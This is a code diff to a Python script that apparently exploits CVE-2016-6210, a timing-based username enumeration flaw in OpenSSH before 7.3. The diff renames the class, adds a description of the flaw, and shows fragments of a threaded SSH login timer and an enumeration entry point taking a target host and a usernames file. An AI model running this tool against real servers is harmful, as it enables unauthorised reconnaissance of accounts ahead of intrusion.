@@ -8,6 +8,7 @@ import sys
 import threading
 import time
 
+# ssh login thread for enum
 class SSHLoginThread(threading.Thread):
     def __init__(self, host, username):
         threading.Thread.__init__(self)
@@ -30,7 +31,15 @@ class SSHLoginThread(threading.Thread):
         total = end - start
         print (LogColors.YELLOW + str(self.username) + " total: " + str(total) + LogColors.ENDC)
 
-class CVE2016_6515:
+# CVE-2016-6210
+# sshd in OpenSSH before 7.3, when SHA256 or SHA512 
+# are used for user password hashing, 
+# uses BLOWFISH hashing on a static password 
+# when the username does not exist, 
+# which allows remote attackers to enumerate users 
+# by leveraging the timing difference between responses 
+# when a large password is provided.
+class CVE2016_6210:
     # set filename with usernames
     def __init__(self, host, fname):
         self.host = host
@@ -74,7 +83,7 @@ if __name__ == '__main__':
     parser.add_argument('-u','--usernames', required = True, help = "ssh usernames file")
     args = vars(parser.parse_args())
     host, fname = args['target'], args['usernames']
-    cve = CVE2016_6515(host, fname)
+    cve = CVE2016_6210(host, fname)
     if cve.is_vulnerable():
         cve.enum_usernames()
 
